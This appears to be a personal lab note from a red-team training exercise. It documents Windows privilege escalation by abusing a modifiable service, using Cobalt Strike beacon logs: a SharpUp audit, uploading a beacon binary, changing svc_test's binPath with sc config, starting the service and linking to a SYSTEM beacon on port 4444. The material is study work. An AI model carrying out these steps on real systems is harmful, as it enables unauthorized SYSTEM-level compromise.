this took a few times to run successfully.
looking up `svc_test` in [[1. wmic service]] displays the result of the path which is `C:\Program Files\Test Service\Test Service.exe `
```powershell
[02/16 20:16:02] beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
[02/16 20:16:03] [*] Tasked beacon to run .NET program: SharpUp.exe audit ModifiableServices
[02/16 20:16:05] [+] host called home, sent: 149292 bytes
[02/16 20:16:06] [+] received output:

=== SharpUp: Running Privilege Escalation Checks ===

[02/16 20:16:06] [+] received output:

=== Modifiable Services ===
	[X] Exception: Exception has been thrown by the target of an invocation.
	[X] Exception: Exception has been thrown by the target of an invocation.
	[X] Exception: Exception has been thrown by the target of an invocation.
	[X] Exception: Exception has been thrown by the target of an invocation.
	Service 'svc_test' (State: Stopped, StartMode: Manual)



[*] Completed Privesc Checks in 0 seconds

```
# Trying to abuse it
made a copy of and renamed `tcp-localonly_x64.exe` to `Service.exe`
![[Pasted image 20240216152244.png]]
unable to upload to that directory
![[Pasted image 20240216152653.png]]
![[Pasted image 20240216153140.png]]
going to try to overwrite the file with the same name

checking to see current path of `svc_test`
```powershell
[02/16 20:39:12] beacon> run sc qc svc_test
[02/16 20:39:12] [*] Tasked beacon to run: sc qc svc_test
[02/16 20:39:12] [+] host called home, sent: 32 bytes
[02/16 20:39:12] [+] received output:
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: svc_test
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Test Service\Test Service.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : svc_test
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```
uploaded `tcp-localonly_x64.svc.exe` to `C:\Windows\Tasks`
![[Pasted image 20240216154302.png]]
changing executable path of `svc_test`
```powershell
[02/16 20:43:58] beacon> run sc config svc_test binPath= C:\Windows\Tasks\tcp-localonly_x64.svc.exe
[02/16 20:43:58] [*] Tasked beacon to run: sc config svc_test binPath= C:\Windows\Tasks\tcp-localonly_x64.svc.exe
[02/16 20:43:58] [+] host called home, sent: 88 bytes
[02/16 20:43:58] [+] received output:
[SC] ChangeServiceConfig SUCCESS
```
checking to ensure that the path was actually changed
```powershell
[02/16 20:44:04] beacon> run sc qc svc_test
[02/16 20:44:04] [*] Tasked beacon to run: sc qc svc_test
[02/16 20:44:04] [+] host called home, sent: 32 bytes
[02/16 20:44:04] [+] received output:
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: svc_test
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\Tasks\tcp-localonly_x64.svc.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : svc_test
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```
![[Pasted image 20240216154654.png]]
`shell netstat -anp tcp` before the service is started
```powershell
[02/16 20:47:13] beacon> shell netstat -anp tcp
[02/16 20:47:13] [*] Tasked beacon to run: netstat -anp tcp
[02/16 20:47:13] [+] host called home, sent: 47 bytes
[02/16 20:47:13] [+] received output:

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49691          0.0.0.0:0              LISTENING
  TCP    10.10.120.100:139      0.0.0.0:0              LISTENING
  TCP    10.10.120.100:3389     10.10.255.244:50850    ESTABLISHED
  TCP    10.10.120.100:54112    10.10.120.254:3128     ESTABLISHED
  TCP    127.0.0.1:13042        0.0.0.0:0              LISTENING
  TCP    127.0.0.1:49158        0.0.0.0:0              LISTENING
```
ran the `svc_test` with the new file path to my `tcp-localonly.svc.exe` beacon
```powershell
[02/16 20:47:26] beacon> run sc start svc_test
[02/16 20:47:26] [*] Tasked beacon to run: sc start svc_test
[02/16 20:47:26] [+] host called home, sent: 35 bytes
[02/16 20:47:27] [+] received output:

SERVICE_NAME: svc_test 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2636
        FLAGS              : 

```
`shell netstat -anp tcp` after the `svc_test` was started
- port 4444 is listening
```powershell
[02/16 20:47:41] beacon> shell netstat -anp tcp
[02/16 20:47:41] [*] Tasked beacon to run: netstat -anp tcp
[02/16 20:47:48] [+] host called home, sent: 47 bytes
[02/16 20:47:49] [+] received output:

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49691          0.0.0.0:0              LISTENING
  TCP    10.10.120.100:139      0.0.0.0:0              LISTENING
  TCP    10.10.120.100:3389     10.10.255.244:50850    ESTABLISHED
  TCP    10.10.120.100:54114    10.10.120.254:3128     ESTABLISHED
  TCP    127.0.0.1:4444         0.0.0.0:0              LISTENING
  TCP    127.0.0.1:13042        0.0.0.0:0              LISTENING
  TCP    127.0.0.1:49158        0.0.0.0:0              LISTENING
```
`connect localhost 4444`
```powershell
[02/16 20:48:03] beacon> connect localhost 4444
[02/16 20:48:03] [*] Tasked to connect to localhost:4444
[02/16 20:48:03] [+] host called home, sent: 20 bytes
[02/16 20:48:03] [+] established link to child beacon: 10.10.120.100
```
![[Pasted image 20240216155900.png]]
connect from `consultant` to become `SYSTEM`